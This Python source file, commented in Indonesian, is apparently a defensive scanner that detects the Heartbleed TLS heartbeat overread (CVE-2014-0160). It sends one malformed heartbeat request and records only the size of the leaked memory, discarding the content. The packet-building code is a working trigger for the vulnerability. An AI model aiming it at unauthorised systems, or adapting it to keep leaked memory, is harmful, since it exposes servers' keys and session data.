"""[SAFETY: active-probe] tls-heartbeat-overread — deteksi dini kebocoran
memori kelas Heartbleed (CVE-2014-0160) secara NON-DESTRUKTIF.

Prinsip (jawaban atas "apakah ada cara selain destruktif?"): ada —
overread protokol. Server yang rentan membalas heartbeat request dengan
payload JAUH lebih panjang dari yang diminta = memori proses ikut
terbaca. Deteksinya satu probe, tanpa crash, tanpa perubahan state.

Disiplin bukti (penting):
  - yang dicatat HANYA fakta "overread N byte" — ISI memori yang bocor
    TIDAK disimpan, TIDAK dicetak, tidak masuk findings (zero data
    retention terhadap konten yang bocor);
  - satu probe per run; tanpa retry;
  - bukan alat ekstraksi — berhenti di verdict.

Kelas tercakup: TLS heartbeat overread (TLS 1.0-1.2 + OpenSSL heartbeat
extension; TLS 1.3 tidak memakai heartbeat). Kelas memory-corruption
(overflow/UAF) memang TIDAK tercakup di sini — deteksinya crash-based
(fuzzing) = disruptif, dan tetap di HOLD sesuai katalog.
"""
from __future__ import annotations

import argparse
import json
import socket
import struct
import sys
import urllib.parse
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "core"))
from findings import make_finding, write_findings  # noqa: E402
from ua import user_agent  # noqa: E402

TLS_CONTENT_HANDSHAKE = 22
TLS_CONTENT_ALERT = 21
TLS_CONTENT_HEARTBEAT = 24
HS_SERVER_HELLO_DONE = 14
MAX_HANDSHAKE_BYTES = 32_768


def build_client_hello(host: str) -> bytes:
    """ClientHello TLS 1.2 + heartbeat extension + SNI (handshake-only:
    tanpa key exchange — cukup sampai ServerHelloDone utk probe)."""
    sni = host.encode("ascii")
    sni_list = b"\x00" + struct.pack(">H", len(sni)) + sni
    sni_data = struct.pack(">H", len(sni_list)) + sni_list
    sni_ext = b"\x00\x00" + struct.pack(">H", len(sni_data)) + sni_data
    hb_ext = b"\x00\x0f" + struct.pack(">H", 1) + b"\x01"
    ext = sni_ext + hb_ext
    # ECDHE modern + RSA legacy (server memilih; kita berhenti di
    # ServerHelloDone — key exchange tidak dibutuhkan utk probe)
    ciphers = struct.pack(">H", 16) + bytes.fromhex(
        "c02fc030c013c014002f0035c009c00a")
    body = (b"\x03\x03"                       # client version TLS 1.2
            + bytes(range(32))                # random (deterministik utk uji)
            + b"\x00"                         # session id len
            + ciphers
            + b"\x01\x00"                     # compression: null
            + struct.pack(">H", len(ext)) + ext)
    hs = b"\x01" + struct.pack(">I", len(body))[1:] + body
    return b"\x16\x03\x01" + struct.pack(">H", len(hs)) + hs


def build_heartbeat_request() -> bytes:
    """Heartbeat request: klaim 16384 byte, kirim 1 byte. Persis satu
    probe — jangan diulang ke target yang sama dalam satu run."""
    msg = b"\x01" + struct.pack(">H", 16384) + b"A"
    return b"\x18\x03\x03" + struct.pack(">H", len(msg)) + msg


def _recv_exact(sock: socket.socket, n: int, buf: bytearray) -> bytes | None:
    while len(buf) < n:
        chunk = sock.recv(min(4096, n - len(buf)))
        if not chunk:
            return None
        buf.extend(chunk)
    out = bytes(buf[:n])
    del buf[:n]
    return out


def read_tls_record(sock: socket.socket, buf: bytearray) -> tuple[int, bytes] | None:
    hdr = _recv_exact(sock, 5, buf)
    if hdr is None:
        return None
    rtype = hdr[0]
    (ln,) = struct.unpack(">H", hdr[3:5])
    if ln == 0 or ln > 18_000:
        return None
    payload = _recv_exact(sock, ln, buf)
    if payload is None:
        return None
    return rtype, payload


def handshake_until_done(sock: socket.socket, host: str) -> bool:
    """Kirim ClientHello, baca record sampai ServerHelloDone. Return
    False bila koneksi/protokol gagal (fail-closed)."""
    buf = bytearray()
    sock.sendall(build_client_hello(host))
    total = 0
    while total < MAX_HANDSHAKE_BYTES:
        rec = read_tls_record(sock, buf)
        if rec is None:
            return False
        rtype, payload = rec
        total += len(payload)
        if rtype == TLS_CONTENT_ALERT:
            return False
        if rtype == TLS_CONTENT_HANDSHAKE and payload:
            if payload[0] == HS_SERVER_HELLO_DONE:
                return True
    return False


def probe_heartbeat(sock: socket.socket) -> dict:
    """Satu heartbeat request. Overread terdeteksi bila payload respons
    > 1 byte yang dikirim. Konten payload TIDAK disimpan."""
    buf = bytearray()
    sock.sendall(build_heartbeat_request())
    sock.settimeout(5.0)
    while True:
        rec = read_tls_record(sock, buf)
        if rec is None:
            return {"vulnerable": False, "overread_len": 0,
                    "detail": "tidak ada respons heartbeat (tidak rentan "
                              "atau tidak mendukung)"}
        rtype, payload = rec
        if rtype == TLS_CONTENT_HEARTBEAT and len(payload) >= 3:
            actual = len(payload) - 3  # type(1) + length(2)
            # aturan deteksi: kita mengirim 1 byte; server yang rentan
            # membalas JAUH lebih banyak (membaca memori proses)
            if actual > 1:
                overread = actual - 1
                # zero data retention: payload dibuang, hanya ukurannya
                return {"vulnerable": True, "overread_len": overread,
                        "detail": f"klaim 1 byte, server membalas "
                                  f"{actual} byte — memori proses "
                                  "ikut terbaca (TIDAK disimpan di "
                                  "bukti)"}
            return {"vulnerable": False, "overread_len": 0,
                    "detail": f"payload {actual} byte = sesuai permintaan "
                              "(tidak rentan)"}
        if rtype == TLS_CONTENT_ALERT:
            return {"vulnerable": False, "overread_len": 0,
                    "detail": "alert dari server (tidak rentan)"}


def check(url: str, timeout: float = 10.0, port: int = 443) -> dict:
    host = urllib.parse.urlparse(
        url if "://" in url else f"https://{url}").hostname
    if not host:
        return {"error": "host tidak valid"}
    try:
        with socket.create_connection((host, port), timeout=timeout) as sock:
            sock.settimeout(timeout)
            if not handshake_until_done(sock, host):
                return {"error": "handshake tidak selesai (bukan TLS 1.2 "
                                 "heartbeat-capable / diblok) — tanpa "
                                 "klaim"}
            res = probe_heartbeat(sock)
            res["port"] = port
            return res
    except (OSError, ValueError) as exc:
        return {"error": f"{type(exc).__name__}: {exc}"}


def audit(url: str, result: dict) -> tuple[list[dict], dict]:
    if result.get("error"):
        rows = [make_finding(
            tool="tls-heartbeat-overread",
            title=f"Heartbeat overread check on {url} — tidak dapat dinilai",
            severity="info",
            description=(f"{result['error']} — deteksi tidak dijalankan "
                         "(tanpa klaim, fail-closed)."),
            target_url=url,
            evidence_kind="request-response", finding_class="posture",
            confidence=1.0, status="unconfirmed", verdict=1,
            extra={"category": "MISC", "safety_class": "active-probe"})]
        return rows, {"url": url, "error": True}
    if result.get("vulnerable"):
        rows = [make_finding(
            tool="tls-heartbeat-overread",
            title=f"TLS heartbeat overread on {url} "
                  f"port {result.get('port', 443)} "
                  f"(+{result['overread_len']} byte) [CVE-2014-0160]",
            severity="high",
            description=f"Heartbeat request mengirim 1 byte tapi "
                        f"dibalas {1 + result['overread_len']} byte — memori "
                        "proses server ikut terbaca (kelas Heartbleed, "
                        "CVE-2014-0160, CWE-125: OpenSSL 1.0.1-1.0.1f, "
                        "dipatch sejak April 2014). Deteksi NON-DESTRUKTIF "
                        "satu probe; isi memori yang bocor TIDAK disimpan "
                        "di bukti (zero data retention). Konteks 2026: "
                        "temuan ini kini paling valid di perangkat "
                        "legacy/IoT/embedded dan server internal yang "
                        "tidak pernah diperbarui — bukan stack modern.",
            recommendation="Perbarui OpenSSL ke >=1.0.1g (rilis April "
                           "2014) atau versi bercadangan terkini, rotasi "
                           "kunci + sertifikat, invalidasi seluruh sesi. "
                           "Referensi: nvd.nist.gov/vuln/detail/"
                           "CVE-2014-0160.",
            cwe="CWE-125",
            target_url=url,
            response=f"overread {result['overread_len']} byte "
                     f"(isi tidak disimpan)",
            evidence_kind="request-response", finding_class="weakness",
            confidence=1.0, status="confirmed", verdict=3,
            extra={"category": "MEMORY-DISCLOSURE",
                   "safety_class": "active-probe",
                   "overread_len": result["overread_len"],
                   "leaked_content_retained": False,
                   "cve": "CVE-2014-0160",
                   "port": result.get("port", 443)})]
        return rows, {"url": url, "vulnerable": True,
                      "overread_len": result["overread_len"]}
    rows = [make_finding(
        tool="tls-heartbeat-overread",
        title=f"No heartbeat overread on {url}",
        severity="info",
        description=f"Heartbeat probe selesai: {result.get('detail')} "
                    "(AMAN/inventaris).",
        target_url=url,
        response=result.get("detail", "")[:200],
        evidence_kind="request-response", finding_class="posture",
        confidence=1.0, status="confirmed", verdict=0,
        extra={"category": "AMAN", "safety_class": "active-probe"})]
    return rows, {"url": url, "vulnerable": False}


def main() -> int:
    ap = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    ap.add_argument("--url", required=True, help="https://host[:port]")
    ap.add_argument("--port", type=int, default=443,
                    help="port layanan TLS (refined: 8443/993/465/995 — "
                         "perangkat legacy/IoT sering di port non-443)")
    ap.add_argument("--out", default="heartbeat_findings.json")
    args = ap.parse_args()
    _ = user_agent()  # konsistensi UA guard lintas skill
    result = check(args.url, port=args.port)
    rows, meta = audit(args.url, result)
    write_findings(args.out, rows,
                   {**meta, "safety_class": "active-probe"})
    print(f"tls-heartbeat-overread: vulnerable={meta.get('vulnerable')} "
          f"-> {args.out}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
